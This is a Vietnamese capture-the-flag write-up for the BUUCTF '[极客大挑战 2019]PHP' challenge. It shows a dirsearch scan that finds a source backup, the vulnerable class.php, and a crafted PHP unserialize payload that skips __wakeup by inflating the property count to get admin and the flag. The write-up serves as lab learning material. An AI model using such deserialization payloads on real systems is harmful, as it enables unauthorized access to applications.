# [极客大挑战 2019]PHP

[Link](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)

Đầu tiên, khi mình boot instance và truy cập vào challenge, mình cảm thấy rất bất ngờ với giao diện của trang web. Mình nghĩ rằng author rất giỏi với giao diện thú vị và vui nhộn như thế.
![1](https://user-images.githubusercontent.com/95614411/173055220-97ee6bb8-4e31-43d2-bb53-170f542d6917.PNG)

Vì author đã gợi ý là họ thường xuyên sao lưu dữ liệu trang web, nhưng vì mình không tìm được manh mối nào khi đọc source HTML, nên mình quyết định dùng Dirsearch để tìm.

`python3 dirsearch.py -u http://089e324c-b9d5-4267-a1b6-5a5e6c644bdf.node4.buuoj.cn:81/ -e php`

Và mình phát hiện ra được một link thú vị, có thể down về source code của web.

![2](https://user-images.githubusercontent.com/95614411/173055306-2f4b161c-b5c0-40cb-9f2c-c816f5e6cc13.PNG)

![3](https://user-images.githubusercontent.com/95614411/173055353-f97a15fe-66ad-42f5-a8c4-4d1105c84a4d.PNG)


ở file class.php:
```
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

điều đầu tiên mình đập vào mắt mình là: 


![image](https://user-images.githubusercontent.com/95614411/173054943-b8052b7b-d389-4068-97a6-79a2ea9686bb.png)

Ở đây, mình xác nhận được, để nhận được flag thì mình phải đăng nhập vào được quyền admin với:
> Username: admin
> 
> Password: 100

Và bây giờ, mình đối mặt với 2 vấn đề: 
- Làm sao để đưa lên server username và password?
- làm sao để đưa vào khi username, password đều nằm trong 1 class?

Mình tiếp tục mở file index.php lên và thấy:

![image](https://user-images.githubusercontent.com/95614411/173056586-1a476fa6-46bc-4c6a-b0c3-0b1fbf2ad4b9.png)

Vậy là mình có thể đưa vào với query string `?select=`

Kế tiếp, mình nhớ là đã xem trên kênh Cyber Jutsu về ý tưởng đưa một ojbect qua query string, nhưng và mình phải tìm cách vượt qua function __wakeup() 

![image](https://user-images.githubusercontent.com/95614411/173057145-80e07ba6-e84e-4554-92ce-41ba85f27968.png)

Mình đã biến tấu một chút ở code và dùng hàm `serialize()` để xem mã hóa của code khi mình tạo một object như bên dưới:

![image](https://user-images.githubusercontent.com/95614411/173057544-d4b9face-7546-4dea-8510-82ac60d0e8aa.png)

Và khi chạy trên localhost thì mình được:

![image](https://user-images.githubusercontent.com/95614411/173057621-60728caf-572a-4881-8841-240793d9a3ba.png)


Payload ban đầu của mình: 

`?select=O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
- ở đây, vì hai biến `username` và `password` mang thuộc tính private, nên mình dùng `%00` điền vào trước chuỗi để khi truy xuất vào được đầy đủ.
 
Và để vượt qua function `__wakeup()` thì mình đã thay đổi một chút:

`?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

Và kết quả:

![image](https://user-images.githubusercontent.com/95614411/173059398-29fc5a8e-43c9-47a6-be28-35ce755c04a5.png)


###### Thanks for reading!




